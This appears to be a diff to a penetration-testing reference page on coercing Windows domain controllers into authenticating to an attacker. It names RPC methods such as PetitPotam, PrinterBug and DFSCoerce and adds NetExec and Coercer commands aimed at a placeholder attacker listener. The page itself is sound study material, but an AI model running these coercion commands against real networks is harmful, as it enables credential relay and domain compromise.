@@ -20,17 +20,21 @@ Several built-in RPC interfaces can be made to authenticate outbound:
 - **PetitPotam (MS-EFSRPC)**: the Encrypting File System remote protocol; `EfsRpcOpenFileRaw` and related calls make the target authenticate to a UNC path you supply. Reachable even from an unauthenticated position on unpatched hosts, otherwise with any domain account.
 - **PrinterBug (MS-RPRN)**: the Print System Remote Protocol; `RpcRemoteFindFirstPrinterChangeNotification` makes the spooler connect back. Works wherever the Print Spooler service runs.
 - **DFSCoerce (MS-DFSNM)**: the Distributed File System namespace-management interface; coerces via the DFS service, present on DCs.
-- **ShadowCoerce (MS-FSRVP)**, **MS-EVEN**, and others provide additional methods when the common two are blocked.
+- **ShadowCoerce (MS-FSRVP)** (shadow-copy service) and **CheeseOunce / MS-EVEN** (the remote Event Log, `ElfrOpenBELW`) provide more methods when the common ones are patched or blocked.
+
+Rather than pick one, cycle them all. **NetExec's `coerce_plus`** module tries every method in one command, and **Coercer** does the same with the widest method set:
 
 ```bash
-# PetitPotam: coerce a DC to authenticate to the attacker listener
-petitpotam.py -u user -p pass -d example.local <attacker-ip> <dc-ip>
+# NetExec: try all coercion methods against the target (checks, then fires at a listener)
+nxc smb <dc-ip> -u user -p pass -M coerce_plus -o LISTENER=<attacker-ip>
 
-# PrinterBug via the spooler
-printerbug.py example.local/user:pass@<dc-ip> <attacker-ip>
+# Coercer: cycle every known RPC coercion method
+coercer coerce -u user -p pass -d example.local -t <dc-ip> -l <attacker-ip>
 
-# DFSCoerce
-dfscoerce.py -u user -p pass -d example.local <attacker-ip> <dc-ip>
+# Single-method Impacket-style triggers
+petitpotam.py -u user -p pass -d example.local <attacker-ip> <dc-ip>   # MS-EFSRPC
+printerbug.py example.local/user:pass@<dc-ip> <attacker-ip>            # MS-RPRN
+dfscoerce.py -u user -p pass -d example.local <attacker-ip> <dc-ip>    # MS-DFSNM
 ```
 
 ## Choosing the callback: SMB vs HTTP
@@ -48,11 +52,14 @@ The protocol the target authenticates over determines what you can do with it:
 
 ## Tools
 
-- **Coercer**: automates every known coercion method against a target.
+- **NetExec (`nxc`) `-M coerce_plus`**: cycle all five methods from one command.
+- **Coercer** (p0dalirius): automates every known coercion method against a target.
 - **PetitPotam.py / printerbug.py / dfscoerce.py** (Impacket-based): single-method triggers.
-- **webclientservicescanner / PetitPotam -pipe**: find and start the WebClient service for HTTP coercion.
+- **webclientservicescanner / PetitPotam `-pipe`**: find and start the WebClient service for HTTP coercion.
 
 ## References
 
-- The Hacker Recipes: coerced authentications
-- Microsoft: MS-EFSRPC, MS-RPRN, MS-DFSNM
+- [Unit 42: authentication coercion keeps evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [Coercer (p0dalirius): coercion method reference](https://github.com/p0dalirius/Coercer)
+- [PetitPotam (topotam)](https://github.com/topotam/PetitPotam)
+- [Microsoft (MS-EFSR): EfsRpcOpenFileRaw](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)
